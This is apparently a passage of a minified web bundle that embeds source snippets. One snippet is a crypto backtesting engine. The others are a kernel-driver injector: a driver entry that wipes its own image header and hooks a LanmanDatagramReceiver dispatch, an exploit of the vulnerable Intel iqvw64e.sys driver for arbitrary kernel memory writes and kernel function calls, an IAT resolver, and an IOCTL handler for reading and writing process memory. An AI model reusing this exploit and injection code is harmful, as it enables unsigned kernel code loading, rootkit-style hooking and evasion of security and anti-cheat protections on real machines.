f of h.values())for(let d=0;d<f.length;d++)for(let g=d+1;g<f.length;g++)E(f[d],f[g]);for(const f of p.values())for(let d=0;d<f.length;d++)for(let g=d+1;g<f.length;g++)E(f[d],f[g]);for(const f of m){if(l.length>=s)break;const[d,g]=f.split("|"),_=u.get(d)??[],v=u.get(g)??[];if(!_.length||!v.length)continue;const w=4+Math.floor(e()*4);for(let S=0;S<w&&!(l.length>=s);S++)l.push({a:_[Math.floor(e()*_.length)],b:v[Math.floor(e()*v.length)],layer:"bridge",weight:.5})}const x=[];for(let f=0;f<n.length;f++)n[f].knotId===null&&x.push(f);for(let f=0;f<o;f++){const d=x[Math.floor(e()*x.length)],g=x[Math.floor(e()*x.length)];d!==g&&c.push({a:d,b:g,layer:"field",weight:.3})}return[...a,...l,...c].slice(0,Xi)}const Ka=1600,Za=900;function ph(i,t){const e={inner:[],bridge:[],field:[]};for(const l of t){const c=i.nodes[l.a],u=i.nodes[l.b];e[l.layer].push(c.x-Ka/2,-(c.y-Za/2),c.z,u.x-Ka/2,-(u.y-Za/2),u.z)}const n=(l,c)=>{const u=new Ie;return u.setAttribute("position",new de(l,3)),new is(u,new Qi({color:16777215,transparent:!0,opacity:c}))},r=n(e.inner,.55),s=n(e.bridge,.32),o=n(e.field,.1),a=new En;return a.add(o,s,r),{inner:r,bridge:s,field:o,group:a}}const fh=`# crypto_backtest.py — vectorized backtest loop with signal confluence, PnL, and drawdown
# Source: Desktop/crypto/backtest/engine.py

from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional

import numpy as np
import pandas as pd
import structlog

from analysis.indicators import IndicatorEngine
from analysis.signals import SignalAggregator, SignalType
from config.settings import Settings

logger = structlog.get_logger(__name__)


@dataclass
class BacktestTrade:
    symbol:       str
    entry_time:   pd.Timestamp
    exit_time:    pd.Timestamp
    side:         str
    entry_price:  float
    exit_price:   float
    amount:       float
    pnl:          float
    pnl_pct:      float
    exit_reason:  str   # "take_profit" | "stop_loss" | "signal"


class BacktestEngine:
    """Event-driven backtester that replays OHLCV bars through the strategy layer."""

    FEE_RATE = 0.001   # 0.1 % Binance taker

    def __init__(self, settings: Settings) -> None:
        self._s          = settings
        self._indicators = IndicatorEngine(settings)
        self._aggregator = SignalAggregator(settings)

    def run(self, symbol: str, df: pd.DataFrame,
            initial_capital: float = 10_000.0):
        df = df.copy()
        self._indicators.compute_all(df)

        capital         = initial_capital
        position: Optional[dict] = None
        trades:   List[BacktestTrade] = []
        equity:   List[float] = []

        start_idx = 200  # warm-up for EMA-200
        if len(df) <= start_idx:
            start_idx = max(50, len(df) // 2)

        for i in range(start_idx, len(df)):
            bar   = df.iloc[i]
            price = bar["close"]

            # ── Equity mark ──────────────────────────────────────────────
            mark = capital + position["amount"] * price if position else capital
            equity.append(mark)

            # ── Stop / take-profit check ──────────────────────────────────
            if position:
                exit_reason, exit_price = None, price

                if price <= position["stop"]:
                    exit_reason = "stop_loss"
                    exit_price  = position["stop"]
                elif price >= position["tp"]:
                    exit_reason = "take_profit"
                    exit_price  = position["tp"]

                if exit_reason:
                    pnl  = (exit_price - position["entry_price"]) * position["amount"]
                    fee  = exit_price * position["amount"] * self.FEE_RATE
                    pnl -= fee
                    capital += position["amount"] * exit_price - fee
                    trades.append(BacktestTrade(
                        symbol=symbol,
                        entry_time=df.index[position["entry_idx"]],
                        exit_time=df.index[i],
                        side="buy",
                        entry_price=position["entry_price"],
                        exit_price=exit_price,
                        amount=position["amount"],
                        pnl=pnl,
                        pnl_pct=(exit_price / position["entry_price"] - 1) * 100,
                        exit_reason=exit_reason,
                    ))
                    position = None
                    continue

            # ── Signal evaluation ─────────────────────────────────────────
            window = df.iloc[max(0, i - 300): i + 1]
            signal = self._aggregator.evaluate(symbol, window)

            if position is None and signal.signal_type == SignalType.BUY:
                agreeing = sum(1 for c in signal.components if c.vote == SignalType.BUY)
                if agreeing >= 3 and signal.confidence >= self._s.min_signal_score:
                    atr        = bar.get("atr", price * 0.01)
                    stop       = price - atr * self._s.atr_stop_multiplier
                    tp         = price + atr * self._s.atr_stop_multiplier * self._s.min_risk_reward
                    risk_cap   = capital * (self._s.max_position_size_pct / 100)
                    amount     = risk_cap / price
                    fee        = price * amount * self.FEE_RATE
                    capital   -= price * amount + fee
                    position   = {"entry_price": price, "amount": amount,
                                  "stop": stop, "tp": tp, "entry_idx": i}

        # ── Summary metrics ───────────────────────────────────────────────
        wins = [t.pnl for t in trades if t.pnl > 0]
        loss = [t.pnl for t in trades if t.pnl <= 0]
        equity_arr = np.array(equity or [initial_capital])
        peak       = np.maximum.accumulate(equity_arr)
        drawdown   = (equity_arr - peak) / peak
        max_dd     = float(drawdown.min() * 100)

        returns    = np.diff(equity_arr) / equity_arr[:-1] if len(equity_arr) > 1 else np.array([0])
        sharpe     = (float(returns.mean()) / float(returns.std() + 1e-9)) * np.sqrt(252) if len(returns) > 1 else 0.0

        logger.info("backtest.complete",
                    symbol=symbol, trades=len(trades),
                    win_rate=len(wins) / max(len(trades), 1),
                    max_drawdown=f"{max_dd:.2f}%", sharpe=f"{sharpe:.2f}")
        return trades, equity, max_dd, sharpe
`,hh=`// drv_entry.cpp — DriverEntry + structured exception support test + inverted function table probe
// Source: D:/BackupFolder/desktop 1114/injector-master/Driver/core/drv_entry.cpp

#include "../mdata/sys_mdata.hpp" 

#include "../base/nocopy.hpp"
#include "../base/nomove.hpp"
#include "../base/singletons.hpp"
#include "../base/vectors.hpp"

#include "../control/packets.hpp"
#include "../control/controls.hpp"

#include "../constants/hashes.hpp"
#include "../constants/strings.hpp"

#include "../kernelutility/erases.hpp"
#include "../kernelutility/imports.hpp"

#include "../directmemory/operations.hpp"
#include "../directmemory/scans.hpp"

#include "../winsdk/sdk/client_id.hpp"
#include "../winsdk/sdk/image_data_directory.hpp"
#include "../winsdk/sdk/image_dos_header.hpp"
#include "../winsdk/sdk/image_export_directory.hpp"
#include "../winsdk/sdk/image_file_header.hpp"
#include "../winsdk/sdk/image_nt_headers.hpp"
#include "../winsdk/sdk/image_optional_header.hpp"
#include "../winsdk/sdk/image_section_header.hpp"
#include "../winsdk/sdk/ldr_data_table_entry.hpp"
#include "../winsdk/sdk/list_entry.hpp"
#include "../winsdk/sdk/nt_tib.hpp"
#include "../winsdk/sdk/peb.hpp"
#include "../winsdk/sdk/peb_ldr_data.hpp"
#include "../winsdk/sdk/string.hpp"
#include "../winsdk/sdk/teb.hpp"
#include "../winsdk/sdk/unicode_string.hpp"

#include "../winsdk/images.hpp"
#include "../winsdk/proc.hpp"
#include "../winsdk/log.hpp"

#include "d_hook.hpp"
#include "w_image_header.hpp"

extern "C" { NTSTATUS DriverEntry( void* driver_object, void* registry_path );}; 

#pragma alloc_text( INIT, DriverEntry )

void* g_hook = nullptr;
std::uint8_t* g_hook_restore = nullptr;

namespace atom::win32
{

enum FUNCTION_TABLE_TYPE
{
	RF_SORTED = 0,
	RF_UNSORTED = 1,
	RF_CALLBACK = 2,
	RF_KERNEL_DYNAMIC = 3,
};

struct RTL_BALANCED_NODE
{
	union
	{
		RTL_BALANCED_NODE* Children[ 2 ] = { };
		struct
		{
			RTL_BALANCED_NODE* Left;
			RTL_BALANCED_NODE* Right;
		};
	};
	union
	{
		std::uint8_t Red : 1;
		std::uint8_t Balance : 2;
		std::uint64_t ParentValue = 0;
	};
};

struct IMAGE_RUNTIME_FUNCTION_ENTRY
{
	std::uint32_t BeginAddress = 0;
	std::uint32_t EndAddress = 0;
	union
	{
		std::uint32_t UnwindInfoAddress = 0;
		std::uint32_t UnwindData;
	};
};

struct DYNAMIC_FUNCTION_TABLE
{
	LIST_ENTRY ListEntry = { };
	IMAGE_RUNTIME_FUNCTION_ENTRY* FunctionTable = nullptr;
	LARGE_INTEGER TimeStamp = { };
	std::uint64_t MinimumAddress = 0;
	std::uint64_t MaximumAddress = 0;
	std::uint64_t BaseAddress = 0;
	void* Callback = nullptr;
	void* Context = nullptr;
	wchar_t* OutOfProcessCallbackDll = nullptr;
	FUNCTION_TABLE_TYPE Type = RF_SORTED;
	std::uint32_t EntryCount = 0;
	RTL_BALANCED_NODE TreeNode = { };
};

struct INVERTED_FUNCTION_TABLE_ENTRY
{
	union
	{
		IMAGE_RUNTIME_FUNCTION_ENTRY* FunctionTable = nullptr;
		DYNAMIC_FUNCTION_TABLE* DynamicTable;
	};
	void* ImageBase = nullptr;
	std::uint32_t SizeOfImage = 0;
	std::uint32_t SizeOfTable = 0;
};

struct INVERTED_FUNCTION_TABLE
{
	std::uint32_t CurrentSize = 0;
	std::uint32_t MaximumSize = 0;
	std::uint32_t Epoch = 0;
	std::uint8_t Overflow = 0;
	std::uint8_t Reserved[ 3 ] = { };
	INVERTED_FUNCTION_TABLE_ENTRY TableEntry[ 256 ] = { };
};

}

namespace atom
{

void TestExceptionSupport()
{
	__try
	{
		const auto image_base = g_map_data.m_base;
		//TRACE( "%s: image_base = '0x%016llX'", __FUNCTION__, image_base );

		const auto dereferenced = *reinterpret_cast< std::uint64_t* >( image_base );
		//TRACE( "%s: dereferenced = '0x%016llX'", __FUNCTION__, dereferenced );

		const auto dereferenced_second = *reinterpret_cast< std::uint64_t* >( dereferenced );
		//TRACE( "%s: dereferenced_second = '0x%016llX'", __FUNCTION__, dereferenced_second );

		const auto image_dos_header = reinterpret_cast< const win32::IMAGE_DOS_HEADER* >( image_base );
		const auto image_nt_headers = reinterpret_cast< const win32::IMAGE_NT_HEADERS* >( image_base + image_dos_header->e_lfanew );

		const auto image_section_header = IMAGE_FIRST_SECTION( image_nt_headers );

		for( std::uint16_t index = 0; index < image_nt_headers->FileHeader.NumberOfSections; index++ )
		{
			const auto image_section = &image_section_header[ index ];

			char image_section_name[ 16 ] = { };
			std::memcpy( image_section_name, image_section->Name, sizeof( image_section->Name ) );

			//TRACE( "%s = '0x%08X, 0x%08X'", image_section_name, image_section->VirtualAddress, image_section->Misc.VirtualSize );
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		// DbgPrint( "[atom::doze] exception occurred!\\n" );
		//TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode() );
	}
}

void TestInvertedFunctionTable()
{
	

	__try
	{
		auto PsInvertedFunctionTable = reinterpret_cast< win32::INVERTED_FUNCTION_TABLE* >( g_map_data.m_symbols.PsInvertedFunctionTable );

		if( PsInvertedFunctionTable )
		{
			//TRACE( "PsInvertedFunctionTable->CurrentSize = '0x%08X'", PsInvertedFunctionTable->CurrentSize );
			//TRACE( "PsInvertedFunctionTable->MaximumSize = '0x%08X'", PsInvertedFunctionTable->MaximumSize );
			//TRACE( "PsInvertedFunctionTable->Epoch = '0x%08X'", PsInvertedFunctionTable->Epoch );
			//TRACE( "PsInvertedFunctionTable->Overflow = '%s'", PsInvertedFunctionTable->Overflow ? "true" : "false" );
			//TRACE_SEPARATOR();

			for( std::uint32_t Index = 0; Index < PsInvertedFunctionTable->CurrentSize; Index++ )
			{
				auto TableEntry = &PsInvertedFunctionTable->TableEntry[ Index ];

				if( TableEntry->ImageBase == memory::ToPointer( g_map_data.m_base ) )
				{
					//TRACE( "TableEntry[%u]->FunctionTable = '0x%016llX'", Index, memory::ToAddress( TableEntry->FunctionTable ) );
					//TRACE( "TableEntry[%u]->ImageBase = '0x%016llX'", Index, memory::ToAddress( TableEntry->ImageBase ) );
					//TRACE( "TableEntry[%u]->SizeOfImage = '0x%08X'", Index, TableEntry->SizeOfImage );
					//TRACE( "TableEntry[%u]->SizeOfTable = '0x%08X'", Index, TableEntry->SizeOfTable );
					//TRACE_SEPARATOR();
				}
			}
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		//TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode() );
	}
}

NTSTATUS DriverDispatch( void* driver_object )
{
	auto status = STATUS_SUCCESS;

	TRACE("Kernel gang");

	__try
	{
		const auto driver_map_context = static_cast< SystemMapData* >( driver_object );

		if( !memory::IsAddressValid( driver_map_context ) )
		{
			TRACE( "%s: driver_map_context is not a valid address!", __FUNCTION__ );
			return status = STATUS_INVALID_PARAMETER;
		}

		std::memcpy( &g_map_data, driver_map_context, sizeof( g_map_data ) );

		if( !g_map_data.IsValid() )
		{
			TRACE( "%s: g_map_data is not valid!", __FUNCTION__ );
			return status = STATUS_INVALID_PARAMETER;
		}

		if( !ImageWipeHeader( g_map_data.m_base ) )
		{
			TRACE( "%s: ImageWipeHeader( '0x%016llX' ) error!", __FUNCTION__ );
		}

		status = HookDispatch( DEVICE_LANMAN_DATAGRAM_RECEIVER );

		if( !NT_SUCCESS( status ) )
		{
			TRACE( "%s: HookDispatch( '%S' ) error! (0x%08X)", __FUNCTION__, DEVICE_LANMAN_DATAGRAM_RECEIVER, status );
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		status = GetExceptionCode();
		TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, status );
	}

	return status;
}

} 

NTSTATUS DriverEntry( void* driver_object, void* registry_path )
{
	UNREFERENCED_PARAMETER( registry_path );
	return atom::DriverDispatch( driver_object );
`,mh=`// iat_patch.cpp — kernel-assisted IAT resolution over IMAGE_IMPORT_DESCRIPTOR chain
// Source: desktop 3-15/injector-master/Loader/core/mmaps.cpp  (MapImageImportDescriptor)

std::uintptr_t GetRemoteImageExport(std::uintptr_t image, const std::string& name)
{
    auto& driver = io::DriverControl::Instance();
    if (!image) return 0;

    const auto image_dos_header = driver.Read<IMAGE_DOS_HEADER>(image);
    if (image_dos_header.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    const auto image_nt_headers = driver.Read<IMAGE_NT_HEADERS>(image + image_dos_header.e_lfanew);
    if (image_nt_headers.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& dir_export = image_nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir_export.VirtualAddress || !dir_export.Size) return 0;

    auto export_buf = std::make_unique<std::uint8_t[]>(dir_export.Size);
    if (!driver.ReadMemory(image + dir_export.VirtualAddress, export_buf.get(), dir_export.Size))
        return 0;

    const auto ied = PIMAGE_EXPORT_DIRECTORY(export_buf.get());
    const auto displacement = std::uintptr_t(export_buf.get()) - dir_export.VirtualAddress;

    const auto addr_of_fns    = reinterpret_cast<std::uint32_t*>(displacement + ied->AddressOfFunctions);
    const auto addr_of_names  = reinterpret_cast<std::uint32_t*>(displacement + ied->AddressOfNames);
    const auto addr_of_ords   = reinterpret_cast<std::uint16_t*>(displacement + ied->AddressOfNameOrdinals);

    for (auto i = 0ul; i < ied->NumberOfNames; i++)
    {
        const auto export_name = std::string(PCHAR(displacement + addr_of_names[i]));
        if (core::ToLower(export_name) == core::ToLower(name))
            return (image + addr_of_fns[addr_of_ords[i]]);
    }
    return 0;
}

bool MapImageImportDescriptor(std::uintptr_t image)
{
    auto& driver = io::DriverControl::Instance();

    const auto image_nt_headers = GetImageNtHeaders(image);
    if (!image_nt_headers) return false;

    const auto import_dir = image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!import_dir.VirtualAddress || !import_dir.Size) return true;

    auto import_descriptor = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        image + import_dir.VirtualAddress);

    while (import_descriptor && import_descriptor->Name)
    {
        const auto mod_name      = reinterpret_cast<const char*>(image + import_descriptor->Name);
        const auto mod_name_wide = core::ToWideString(mod_name);
        const auto mod_base      = driver.GetImage(mod_name_wide.c_str());

        if (mod_base)
        {
            auto thunk_data = reinterpret_cast<IMAGE_THUNK_DATA*>(
                image + import_descriptor->FirstThunk);

            while (thunk_data && thunk_data->u1.AddressOfData)
            {
                if (!(thunk_data->u1.Ordinal & IMAGE_ORDINAL_FLAG64))
                {
                    const auto ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        image + thunk_data->u1.AddressOfData);
                    const auto proc = GetRemoteImageExport(mod_base, ibn->Name);

                    if (proc)
                    {
                        TRACE("%s: %s: [0x%016llX]", __FUNCTION__, ibn->Name, proc);
                        thunk_data->u1.Function = proc;
                    }
                }
                thunk_data++;
            }
        }
        import_descriptor++;
    }
    return true;
}
`,_h=`// intel_exploit.cpp — Intel iqvw64e.sys exploit primitives (MmMapLockedPages / MmAllocatePagesForMdl)
// Source: D:/BackupFolder/desktop 1114/injector-master/Loader/kernelutility/Intel2.cpp

}

BOOLEAN bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return 0;
	return (*szMask) == 0;
}

uintptr_t FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	size_t max_len = dwLen - strlen(szMask);
	for (uintptr_t i = 0; i < max_len; i++)
		if (bDataCompare((BYTE*)(dwAddress + i), bMask, szMask))
			return (uintptr_t)(dwAddress + i);
	return 0;
}

PVOID FindSection(char* sectionName, uintptr_t modulePtr, PULONG size) {
	size_t namelength = strlen(sectionName);
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, sectionName, namelength) == 0 &&
			namelength == strlen((char*)section->Name)) {
			if (!section->VirtualAddress) {
				return 0;
			}
			if (size) {
				*size = section->Misc.VirtualSize;
			}
			return (PVOID)(modulePtr + section->VirtualAddress);
		}
	}
	return 0;
}

bool intel_driver2::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver2::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver2::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver2::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver2::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver2::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver2::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver2::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		//Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory) {
		//Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		//Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}

/*added by psec*/
uint64_t intel_driver2::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmAllocatePagesForMdl");

	if (!kernel_MmAllocatePagesForMdl)
	{
		//Log(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
		return 0;
	}

	uint64_t allocated_pages = 0;

	if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocated_pages;
}

uint64_t intel_driver2::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

	if (!kernel_MmMapLockedPagesSpecifyCache)
	{
		//Log(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
		return 0;
	}

	uint64_t starting_address = 0;

	if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return starting_address;
}

bool intel_driver2::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmProtectMdlSystemAddress");

	if (!kernel_MmProtectMdlSystemAddress)
	{
		//Log(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver2::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmUnmapLockedPages");

	if (!kernel_MmUnmapLockedPages)
	{
		//Log(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver2::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmFreePagesFromMdl");

	if (!kernel_MmFreePagesFromMdl)
	{
		//Log(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/
`,gh=`// ioctl_dispatch.c — IRP_MJ_DEVICE_CONTROL dispatch table and completion routine
// Source: desktop 3-15/injector-master/Driver/control/controls.cpp

NTSTATUS DispatchDeviceControl(DEVICE_OBJECT* device_object, IRP* irp)
{
    UNREFERENCED_PARAMETER(device_object);

    NTSTATUS status      = STATUS_SUCCESS;
    UINT64   information = 0;

    const IO_STACK_LOCATION* io_stack = IoGetCurrentIrpStackLocation(irp);

    if (io_stack)
    {
        const ULONG io_request_size  = io_stack->Parameters.DeviceIoControl.InputBufferLength;
        const ULONG io_response_size = io_stack->Parameters.DeviceIoControl.OutputBufferLength;

        if (io_request_size  >= sizeof(BaseRequest) &&
            io_response_size >= sizeof(BaseResponse))
        {
            const PVOID io_request_data = irp->AssociatedIrp.SystemBuffer;

            if (io_request_data)
            {
                PVOID io_response_data = GetSystemAddressForMdl(irp->MdlAddress, NormalPagePriority);

                if (io_response_data)
                {
                    switch (io_stack->MajorFunction)
                    {
                        case IRP_MJ_DEVICE_CONTROL:
                        {
                            Operation io_operation =
                                (Operation)io_stack->Parameters.DeviceIoControl.IoControlCode;

                            switch (io_operation)
                            {
                                case Operation_QueryDriverVersion:
                                {
                                    if (io_request_size >= sizeof(QueryDriverVersionRequest))
                                    {
                                        QueryDriverVersionResponse response = { SignatureResponse };
                                        status = OnQueryDriverVersion(
                                            (QueryDriverVersionRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                                case Operation_UserMemoryRead:
                                {
                                    if (io_request_size >= sizeof(UserMemoryReadRequest))
                                    {
                                        UserMemoryReadResponse response = { SignatureResponse };
                                        status = OnUserMemoryRead(
                                            (UserMemoryReadRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                                case Operation_UserMemoryWrite:
                                {
                                    if (io_request_size >= sizeof(UserMemoryWriteRequest))
                                    {
                                        UserMemoryWriteResponse response = { SignatureResponse };
                                        status = OnUserMemoryWrite(
                                            (UserMemoryWriteRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                                case Operation_UserMemoryCommit:
                                {
                                    if (io_request_size >= sizeof(UserMemoryCommitRequest))
                                    {
                                        UserMemoryCommitResponse response = { SignatureResponse };
                                        status = FuckedUpMemoryAllocate(
                                            (UserMemoryCommitRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                            }
                            break;
                        }
                    }
                }
            }
        }
    }

    if (information)
    {
        irp->IoStatus.Status      = status;
        irp->IoStatus.Information = information;
        IoCompleteRequest(irp, IO_NO_INCREMENT);
    }
    else
    {
        status = STATUS_NOT_IMPLEMENTED;
    }

    return status;
}

NTSTATUS DeviceControl(DEVICE_OBJECT* device_object, IRP* irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    __try
    {
        status = DispatchDeviceControl(device_object, irp);

        if (status == STATUS_NOT_IMPLEMENTED)
            status = g_driver_dispatch(device_object, irp);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        TRACE("%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode());
        status = g_driver_dispatch(device_object, irp);
    }

    return status;
}
`,vh=`// kernel_loader.cpp — usermode -> kernel image resolver and export walker
// Source: D:/BackupFolder/desktop 1114/injector-master/Loader/kernelutility/load.cpp

}

std::uintptr_t Loader::GetSystemImage( const std::string& name )
{
	PVOID device_drivers[ 1024 ] = { };
	DWORD device_drivers_size = 0;

	K32EnumDeviceDrivers( device_drivers, sizeof( device_drivers ), &device_drivers_size );

	DWORD device_drivers_count = device_drivers_size / sizeof( PVOID );

	for( DWORD i = 0; i < device_drivers_count; i++ )
	{
		const auto device_driver = device_drivers[ i ];

		if( !device_driver )
			continue;

		char device_driver_name[ MAX_PATH ] = { };
		K32GetDeviceDriverBaseNameA( device_driver, device_driver_name, MAX_PATH );

		if( core::ToLower( device_driver_name ) == core::ToLower( name ) )
		{
			return std::uintptr_t( device_driver );
		}
	}

	return 0;
}

std::uintptr_t Loader::GetSystemImage( const std::wstring& name )
{
	PVOID device_drivers[ 1024 ] = { };
	DWORD device_drivers_size = 0;

	K32EnumDeviceDrivers( device_drivers, sizeof( device_drivers ), &device_drivers_size );

	DWORD device_drivers_count = device_drivers_size / sizeof( PVOID );

	for( DWORD i = 0; i < device_drivers_count; i++ )
	{
		const auto device_driver = device_drivers[ i ];

		if( !device_driver )
			continue;

		wchar_t device_driver_name[ MAX_PATH ] = { };
		K32GetDeviceDriverBaseNameW( device_driver, device_driver_name, MAX_PATH );

		if( core::ToLower( device_driver_name ) == core::ToLower( name ) )
		{
			return std::uintptr_t( device_driver );
		}
	}

	return 0;
}

